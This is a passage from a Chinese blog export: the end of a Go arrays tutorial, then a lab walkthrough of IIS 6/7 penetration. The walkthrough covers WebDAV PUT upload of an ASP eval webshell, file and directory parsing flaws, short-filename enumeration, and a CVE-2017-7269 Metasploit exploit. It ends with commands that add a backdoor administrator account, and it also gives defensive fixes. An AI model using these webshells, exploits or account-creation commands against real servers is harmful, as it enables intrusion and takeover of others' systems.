punctuation">{</span><span class="token punctuation">{</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token string">"李四"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"王五"</span><span class="token punctuation">,</span> <span class="token string">"马六"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment">//这里忽略索引</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v1 <span class="token operator">:=</span> <span class="token keyword">range</span> a <span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v2 <span class="token operator">:=</span> <span class="token keyword">range</span> v1 <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s\t"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 进行换行</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102113843.png" alt="image-20211110120214235"></p><p>注意：多维数组<strong>只有第一层</strong>可以使用<code>...</code>来让编译器推导数组长度</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token string">"李四"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"王五"</span><span class="token punctuation">,</span> <span class="token string">"马六"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment">//这里忽略索引</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v1 <span class="token operator">:=</span> <span class="token keyword">range</span> a <span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v2 <span class="token operator">:=</span> <span class="token keyword">range</span> v1 <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s\t"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 进行换行</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102113844.png" alt="image-20211110120433845"></p><h3 id="数组是值类型"><a href="#数组是值类型" class="headerlink" title="数组是值类型"></a>数组是值类型</h3><p>数组是值类型，赋值和传参会复制整个数组。因此改变副本的值，不会改变本身的值。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">modifyArray</span><span class="token punctuation">(</span>x <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">modifyArray2</span><span class="token punctuation">(</span>x <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">}</span><span class="token function">modifyArray</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">//在modify中修改的是a的副本x</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">//[10 20 30]</span>b <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token function">modifyArray2</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment">//在modify中修改的是b的副本x</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token comment">//[[1 1] [1 1] [1 1]]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102113845.png" alt="image-20211110120759610"></p><h2 id="特别注意"><a href="#特别注意" class="headerlink" title="特别注意"></a>特别注意</h2><ol><li>数组支持 <code>==</code>、<code>!=</code> 操作符，因为内存总是被初始化过的</li><li><code>[n]*T</code>表示指针数组，<code>*[n]T</code>表示数组指针 </li></ol>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go语言数组学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS小结</title>
      <link href="/2021/10/28/iis/"/>
      <url>/2021/10/28/iis/</url>
      
        <content type="html"><![CDATA[<h1 id="安装IIS6"><a href="#安装IIS6" class="headerlink" title="安装IIS6"></a>安装IIS6</h1><p>这边在Windows Server 2003上安装</p><p><img src="https://img-blog.csdnimg.cn/20210419203534647.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419203550907.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419203625404.png" alt="在这里插入图片描述"></p><p>IIS 6.X 安装是需要插件的</p><p>安装完成了</p><p><img src="https://img-blog.csdnimg.cn/2021041920394431.png" alt="在这里插入图片描述"></p><p>打开就是这样</p><p><img src="https://img-blog.csdnimg.cn/20210419204156932.png" alt="在这里插入图片描述"></p><h1 id="安装IIS7"><a href="#安装IIS7" class="headerlink" title="安装IIS7"></a>安装IIS7</h1><p>IIS7-win7-x64</p><p><img src="https://img-blog.csdnimg.cn/20210419205319689.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210419205443191.png" alt="在这里插入图片描述"></p><h1 id="IIS-6-X渗透"><a href="#IIS-6-X渗透" class="headerlink" title="IIS 6.X渗透"></a>IIS 6.X渗透</h1><h2 id="0x01-IIS写权限漏洞"><a href="#0x01-IIS写权限漏洞" class="headerlink" title="0x01 IIS写权限漏洞"></a>0x01 IIS写权限漏洞</h2><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>开启WebDAV引起的IIS写权限漏洞（攻击者可以上传文件）</p><p>PUT任意上传漏洞！</p><p><img src="https://img-blog.csdnimg.cn/20210419204344870.png" alt="在这里插入图片描述"></p><p>开启脚本资源访问和写入：</p><p><img src="https://img-blog.csdnimg.cn/20210419204505486.png" alt="在这里插入图片描述"></p><p>尝试写一个html文件</p><pre class="line-numbers language-none"><code class="language-none">&lt;center&gt;&lt;h1&gt;this is ASP a001 hello&lt;/center&gt;&lt;h1&gt;&lt;%eval request("a001")%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>IIS7远程访问一下</p><p><img src="https://img-blog.csdnimg.cn/2021041920491958.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210419211149191.png" alt="在这里插入图片描述"></p><p>这边用一个工具</p><p><img src="https://img-blog.csdnimg.cn/20210419214747665.png" alt="在这里插入图片描述"></p><p>添加对端IP和端口</p><p><img src="https://img-blog.csdnimg.cn/20210419214819595.png" alt="在这里插入图片描述"></p><p>看到是可以写入的</p><p>打开Windows Server 2003上默认网站对用户的权限</p><p><img src="https://img-blog.csdnimg.cn/20210419220138851.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210419220759356.png" alt="在这里插入图片描述"></p><p>写入一句话木马</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">&lt;</span><span class="token operator">%</span>eval <span class="token function">request</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用一个的<code>.exe</code>文件  进行PUT上传</p><p><img src="https://img-blog.csdnimg.cn/20210419220845103.png" alt="在这里插入图片描述"></p><p>可以看到成功了</p><p>去Windows Server 2003上看一下 刷新一下</p><p><img src="https://img-blog.csdnimg.cn/20210419220909777.png" alt="在这里插入图片描述"></p><p>可以看到上传成功了</p><p>这里说明一下</p><p>成功通过PUT方法上传了一个含有<code>asp</code>的一句话木马的txt文件</p><p>之所以不直接上传一个asp一句话是因为通常上传txt文本不会出错，但是上传asp就会报错</p><p>这个时候经过修改一下就可以了</p><p>这里要去Windows Server 2003开启IIS的asp解析功能</p><p><img src="https://img-blog.csdnimg.cn/20210419222035267.png" alt="在这里插入图片描述"></p><p>然后把刚才上传上去的1.txt文件改名为shell.asp</p><p><img src="https://img-blog.csdnimg.cn/20210419222246923.png" alt="在这里插入图片描述"></p><p>然后访问，拿蚁剑连接就可以了</p><p><img src="https://img-blog.csdnimg.cn/20210419222346964.png" alt="-"></p><p><img src="https://img-blog.csdnimg.cn/20210419222438344.png" alt="在这里插入图片描述"></p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>1.关闭 WebDav<br>2.关闭写入权限</p><h2 id="0x02-解析漏洞"><a href="#0x02-解析漏洞" class="headerlink" title="0x02 解析漏洞"></a>0x02 解析漏洞</h2><h3 id="IIS文件解析漏洞"><a href="#IIS文件解析漏洞" class="headerlink" title="IIS文件解析漏洞"></a>IIS文件解析漏洞</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>IIS文件解析漏洞：<code>*.asp;.xxx</code>像这样畸形的文件IIS只会把他当作xxx.asp文件执行不会看分号之后的内容。</p><h4 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h4><p>IIS文件解析漏洞</p><p>首先在Windows Server 2003上创建一个a001.asp</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">&lt;</span><span class="token operator">%=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token operator">&gt;</span>  会显示当前的时间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210419222719562.png" alt="在这里插入图片描述"></p><p>同样也是要开启IIS的asp解析功能</p><p><img src="https://img-blog.csdnimg.cn/20210419222035267.png" alt="在这里插入图片描述"></p><p>远程访问一下</p><p><img src="https://img-blog.csdnimg.cn/20210419223437566.png" alt="在这里插入图片描述"></p><p>然后开始分析</p><p><code>a001.asp;.jpg</code>–&gt;实际访问的是<code>a001.asp</code></p><p><code>a001.asp;.zip</code>–&gt;实际访问的是<code>a001.zip</code></p><p><img src="https://img-blog.csdnimg.cn/20210419223815843.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210419223749142.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419223800836.png" alt="在这里插入图片描述"></p><p>这个时候 当我们将这个内容改成asp的一句话木马时</p><p>访问一下</p><p><img src="https://img-blog.csdnimg.cn/20210419224412315.png" alt="在这里插入图片描述"></p><p>拿蚁剑连接一下 是可以的</p><p><img src="https://img-blog.csdnimg.cn/20210419224429122.png" alt="在这里插入图片描述"></p><h3 id="IIS目录解析漏洞"><a href="#IIS目录解析漏洞" class="headerlink" title="IIS目录解析漏洞"></a>IIS目录解析漏洞</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>IIS目录解析漏洞：以<code>*.asp</code>命名的文件夹中的文件都会被当作asp文件执行</p><p>创建一个1.asp目录</p><p><img src="https://img-blog.csdnimg.cn/20210419225717659.png" alt="在这里插入图片描述"></p><p>把之前的1.txt复制进来</p><p><img src="https://img-blog.csdnimg.cn/20210419225739769.png" alt="在这里插入图片描述"></p><p>访问一下</p><p><img src="https://img-blog.csdnimg.cn/20210419225638291.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210419225657973.png" alt="在这里插入图片描述"></p><h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ul><li><p>设置权限无<br><img src="https://img-blog.csdnimg.cn/202104210658587.png" alt="在这里插入图片描述"></p></li><li><p>不允许新建目录。</p></li><li><p>上传的文件需经过重命名（时问戳+随机数+jpg等）</p></li></ul><h2 id="0x03-IIS短文件漏洞"><a href="#0x03-IIS短文件漏洞" class="headerlink" title="0x03 IIS短文件漏洞"></a>0x03 IIS短文件漏洞</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>攻击者可以利用<code>~</code>字符猜解或遍历服务器中的文件名，或对IIS服务器中的 Net framework进行拒绝服务攻击！</p><p>就是存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件</p><p>我们到IIS目录下 去看一下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">dir <span class="token operator">/</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210420171101419.png" alt="在这里插入图片描述"></p><h3 id="IIS短文件名产生"><a href="#IIS短文件名产生" class="headerlink" title="IIS短文件名产生"></a>IIS短文件名产生</h3><ul><li>当后缀小于4时，短文件名产生需要文件（夹）名前缀字符长度大于等于9位</li><li>当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名</li></ul><p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种</p><p>IIS8.0之后的版本只能通过 OPTIONS和 TRACE方法被猜测成功</p><h3 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h3><p>IIS8.0以下版本需要开启 ASP.NET支持，IIS大于等于8.0版本，即使没有安装 ASP.NET，通过OPTIONS和 TRACE方法也可以猜解成功</p><p>需要安装一下ASP.NET</p><p><img src="https://img-blog.csdnimg.cn/20210420171424702.png" alt="在这里插入图片描述"></p><p>然后就多了这么一个东西</p><p><img src="https://img-blog.csdnimg.cn/20210420171811661.png" alt="在这里插入图片描述"><br>新建一个<code>.aspx</code>的文件</p><p><img src="https://img-blog.csdnimg.cn/20210420171930491.png" alt="在这里插入图片描述"></p><p>可以看到它也是存在的</p><p><img src="https://img-blog.csdnimg.cn/20210420172013848.png" alt="在这里插入图片描述"></p><p>正常情况下 我们远程访问一下 </p><p>它的返回是404</p><p><img src="https://img-blog.csdnimg.cn/20210420172206900.png" alt="在这里插入图片描述"></p><p>或者是400的错误</p><p>用一个工具去爆破它</p><p>具体看这里</p><p><a href="https://github.com/WebBreacher/tilde_enum">https://github.com/WebBreacher/tilde_enum</a><br><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a></p><p>安装java7</p><p>启动就是这样</p><p><img src="https://img-blog.csdnimg.cn/20210420173003592.png" alt="在这里插入图片描述"><br>需要输入对端的IP</p><p><img src="https://img-blog.csdnimg.cn/20210420173126959.png" alt="在这里插入图片描述"></p><p>这里选no</p><p>然后一路回车就好了</p><p>它就爆破出来了</p><p><img src="https://img-blog.csdnimg.cn/20210420173240954.png" alt="在这里插入图片描述"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><h4 id="1-从CMD命令关闭NTFS8-3文件格式的支持"><a href="#1-从CMD命令关闭NTFS8-3文件格式的支持" class="headerlink" title="1.从CMD命令关闭NTFS8.3文件格式的支持"></a>1.从CMD命令关闭NTFS8.3文件格式的支持</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">Windows server2003：（<span class="token number">1</span>代表关闭，<span class="token number">0</span>代表开启关闭该功能fsutil behavior set disable8dot3 <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">Windows server <span class="token number">2008</span> R2：查询是否开启短文件名功能：fsutil <span class="token number">8</span>dot3name query关闭该功能：fsutil <span class="token number">8</span>dot3name set <span class="token number">1</span>不同系统关闭命令稍有区别，该功能默认是开启的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-从修改注册表关闭NTFS-8-3文件格式的支持"><a href="#2-从修改注册表关闭NTFS-8-3文件格式的支持" class="headerlink" title="2.从修改注册表关闭NTFS 8.3文件格式的支持"></a>2.从修改注册表关闭NTFS 8.3文件格式的支持</h4><p>快捷键Win+R打开命令窗口，输入 regedit打开注册表窗口</p><p>找到路径</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210421071306721.png" alt="在这里插入图片描述"><br>将其中的 NtfsDisable8dot3NameCreation这一项的值设为1，1代表不创建短文件名格式</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>以上两种方式修改完成后，均需要重启系统生效。<br><strong>此方法只能禁止NTFS 8.3格式文件名创建，已经存在的文件的短文件名无法移除，需要重新复制才会消失</strong></p><h3 id="实战用处"><a href="#实战用处" class="headerlink" title="实战用处"></a>实战用处</h3><ul><li>猜后台。</li><li>猜敏感文件，例如备份的<code>rar</code>、<code>zip</code>、<code>.bαk</code>、<code>.SQL</code>文件等。</li><li>在某些情形下，甚至可以通过短文件名直接下载对应的文件。比如下载备份SQL文件。</li></ul><h3 id="IIS短文件漏洞局限性"><a href="#IIS短文件漏洞局限性" class="headerlink" title="IIS短文件漏洞局限性"></a>IIS短文件漏洞局限性</h3><ul><li>如果文件名本身太短也是无法猜解的</li><li>此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解</li><li>如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配</li><li>如果文件夹名前6位字符带点<code>.</code>，扫描程序会认为是文件而不是文件夹，最终出现误报</li><li>不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测</li></ul><h2 id="0x04-RCE-CVE-2017-7269"><a href="#0x04-RCE-CVE-2017-7269" class="headerlink" title="0x04 RCE-CVE-2017-7269"></a>0x04 RCE-CVE-2017-7269</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以<code>If:&lt;http://</code>开头的长标头执行任意代码 PROPFIND请求</p><h3 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h3><p>WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p><p>复现一下这个漏洞</p><p>根据需求进行设置</p><p><img src="https://img-blog.csdnimg.cn/20210420173539422.png" alt="在这里插入图片描述"></p><p>然后在Win7 远程打一下Windows Server 2003</p><p>Exp地址</p><p><a href="https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py">https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py</a></p><p>Exp是基于python2的</p><p>修改一下</p><p>对端IP和端口</p><p><img src="https://img-blog.csdnimg.cn/20210420173855222.png" alt="在这里插入图片描述"></p><p>执行一下</p><p><img src="https://img-blog.csdnimg.cn/20210420173933357.png" alt="在这里插入图片描述"></p><p>去看看Win7的进程</p><p>多了<code>calc.exe</code>这样一个进程</p><p><img src="https://img-blog.csdnimg.cn/20210420174111203.png" alt="在这里插入图片描述"></p><p>证明是存在缓冲区溢出的</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>关闭 WebDav服务</li><li>使用相关防护设备</li></ul><h3 id="实战中的应用"><a href="#实战中的应用" class="headerlink" title="实战中的应用"></a>实战中的应用</h3><p>条件：IIS 6.0 开启WebDav</p><p>接下来演示</p><p>exp：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">https<span class="token operator">:</span><span class="token comment">//github.com/zcgonvh/cve-2017-7269</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载后注意一点 进行更名一下</p><p><img src="https://img-blog.csdnimg.cn/20210420174824230.png" alt="在这里插入图片描述"><br>然后我们把这个<code>.rb</code>文件放入MSF的渗透框架中</p><p>/usr/share/metasploit-framework/modules/exploits/windows/iis/</p><p>然后执行cp命令即可</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">cp <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>cve_2017_7269<span class="token punctuation">.</span>rb <span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动MSF</p><p>使用这个模块</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>iis<span class="token operator">/</span>cve_2017_7269<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210420175817649.png" alt="在这里插入图片描述"></p><p>但是并没有拿到shell</p><p>进行排错一下</p><p><img src="https://img-blog.csdnimg.cn/2021042017575348.png" alt="在这里插入图片描述"></p><p>在IP地址中未分配，可以解释为非默认绑定</p><p><strong>注意：该exp只适用默认绑定和默认路径的情况才可以提权！</strong></p><p><img src="https://img-blog.csdnimg.cn/20210420175859782.png" alt="在这里插入图片描述"></p><p>这里 做不做都是可以的</p><p>就是批量检测进程溢出</p><p>这里有个工具</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">https<span class="token operator">:</span><span class="token comment">//github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">python IIS6_WebDAV_Scanner<span class="token punctuation">.</span>py <span class="token operator">-</span>p <span class="token number">1.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210421081103207.png" alt="在这里插入图片描述"><br>得到溢出值是19</p><p>然后设置MSF中的PhysicalPathLength为19</p><p>MSF 重新跑一下</p><p>成功拿到了shell</p><p><img src="https://img-blog.csdnimg.cn/2021042019273069.png" alt="在这里插入图片描述"></p><p>简单看一下权限</p><p><img src="https://img-blog.csdnimg.cn/20210420193035852.png" alt="在这里插入图片描述"></p><p>是真的 好低哇</p><p>这里用到一个提权工具 </p><p>针对缓冲区溢出的一个工具 挺老的</p><p>进行上传</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">upload <span class="token string">'/root/Desktop/pr.exe'</span>  c<span class="token operator">:</span>\Windows\system32\inetsrv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后进行创建用户</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pr<span class="token punctuation">.</span>exe <span class="token string">"net user a002 963852 /add"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加到管理员组</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pr<span class="token punctuation">.</span>exe "net localgroup administrators a002 <span class="token operator">/</span>add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="IIS7-x渗透"><a href="#IIS7-x渗透" class="headerlink" title="IIS7.x渗透"></a>IIS7.x渗透</h1><h2 id="0x01-解析漏洞"><a href="#0x01-解析漏洞" class="headerlink" title="0x01 解析漏洞"></a>0x01 解析漏洞</h2><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg/png后面加上/php，会将a001.jpg/png解析为php文件</p><p>修复建议：配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序</p><p>我这边在Windows Server 2008 R2上进行搞</p><p><img src="https://img-blog.csdnimg.cn/20210420200103496.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210420212942627.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210420213012789.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210420213052813.png" alt="在这里插入图片描述"></p><p>安装成功后 打开</p><p>IIS7是有一个默认网站的</p><p>本地访问一下 ok</p><p> 这就成功了</p><p><img src="https://img-blog.csdnimg.cn/20210420213347434.png" alt="在这里插入图片描述"></p><p>确定版本</p><p><img src="https://img-blog.csdnimg.cn/20210420220352284.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210420220412341.png" alt="在这里插入图片描述"></p><p>确认是IIS7.5的版本</p><p>然后这边我用phpstudy进行联动</p><p>切换版本</p><p><img src="https://img-blog.csdnimg.cn/20210420215553168.png" alt="在这里插入图片描述"><br>报了个错 说找不到</p><p>把这个文件扩展名 打开</p><p><img src="https://img-blog.csdnimg.cn/20210420215800622.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210420220147508.png" alt="在这里插入图片描述"></p><p>Google的解决方案是说 因为phpstudy安装在了C盘目录下</p><p>所以启动要拿管理员启动</p><p>切换成功</p><p><img src="https://img-blog.csdnimg.cn/20210420220309776.png" alt="在这里插入图片描述"></p><p>查看网站的基本信息</p><p><img src="https://img-blog.csdnimg.cn/20210420220615700.png" alt="在这里插入图片描述"></p><p>默认端口是8980</p><p>那就访问一下phpstudy网站目录下的东西吧</p><p>访问康康哇</p><p><img src="https://img-blog.csdnimg.cn/202104202208348.png" alt="在这里插入图片描述"></p><p>成功访问</p><p><img src="https://img-blog.csdnimg.cn/2021042022090097.png" alt="在这里插入图片描述"></p><p>如果你没有用phpstudy的话</p><p>那么就要手动添加</p><p><img src="https://img-blog.csdnimg.cn/20210420221109849.png" alt="在这里插入图片描述"></p><p>右键添加 选择php安装目录下的的<code>php-cgi.exe</code>的文件 就可以了 </p><p><img src="https://img-blog.csdnimg.cn/20210420221125115.png" alt="在这里插入图片描述"></p><p>强调一下</p><p>这个勾要打上</p><p><img src="https://img-blog.csdnimg.cn/20210420221249468.png" alt="在这里插入图片描述"></p><p>把Windows Server 2008 R2的防火墙关闭一下</p><p>然后远程访问一下 </p><p>中间端口打错了 </p><p><img src="https://img-blog.csdnimg.cn/20210420222250761.png" alt="在这里插入图片描述"></p><p>解析漏洞</p><p><img src="https://img-blog.csdnimg.cn/20210420223553997.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210420223003226.png" alt="在这里插入图片描述"></p><p>我们访问一下</p><p><img src="https://img-blog.csdnimg.cn/20210420223026843.png" alt="在这里插入图片描述"></p><p>发现是不可以的</p><p>解析漏洞来了</p><p><img src="https://img-blog.csdnimg.cn/20210420223135450.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210420223156123.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210420223213733.png" alt="在这里插入图片描述"></p><p>把这个对勾去了就可以了</p><p><img src="https://img-blog.csdnimg.cn/2021042022323518.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210420223726957.png" alt="在这里插入图片描述"></p><p>成功解析为<code>.php</code>文件</p><p>WebDAV在IIS7.5  在这里<img src="https://img-blog.csdnimg.cn/20210420223923728.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2021042022393652.png" alt="在这里插入图片描述"></p><h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><p>配置 <code>cgi.fix_pathinfo(php.ini中)</code>为0并重启php-cgi程序</p><h2 